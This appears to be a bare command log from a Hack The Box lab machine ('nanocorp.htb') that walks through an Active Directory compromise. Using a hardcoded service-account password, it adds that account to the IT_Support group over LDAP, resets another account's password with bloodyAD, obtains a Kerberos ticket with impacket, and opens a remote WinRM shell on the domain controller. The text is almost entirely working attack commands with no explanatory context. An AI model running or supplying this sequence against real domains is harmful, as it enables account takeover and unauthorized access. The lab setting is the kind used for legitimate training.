
ldapmodify -x -H ldap://10.129.243.199 \
  -D "WEB_SVC@nanocorp.htb" -w 'dksehdgh712!@#' << 'EOF'
dn: CN=IT_Support,CN=Users,DC=nanocorp,DC=htb
changetype: modify
add: member
member: CN=web_svc,CN=Users,DC=nanocorp,DC=htb
EOF

ldapsearch -x -H ldap://10.129.243.199 \
  -D "WEB_SVC@nanocorp.htb" -w 'dksehdgh712!@#' \
  -b "CN=IT_Support,CN=Users,DC=nanocorp,DC=htb" member

bloodyAD --host "10.129.243.199" -d "nanocorp.htb" -u "web_svc" -p 'dksehdgh712!@#' set password "monitoring_svc" 'Tryhackme@'

┌──(kali㉿kali)-[~/HTB/nanocorp]
└─$ python3 /usr/share/doc/python3-impacket/examples/getTGT.py 'nanocorp.htb/monitoring_svc:Tryhackme@' -dc-ip 10.129.243.199
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in monitoring_svc.ccache

export KRB5CCNAME=monitoring_svc.ccache

python3 evil_winrmexec.py -port 5986 -ssl nanocorp.htb/'monitoring_svc:Tryhackme@'@DC01.nanocorp.htb -k

source winrm-venv/bin/activate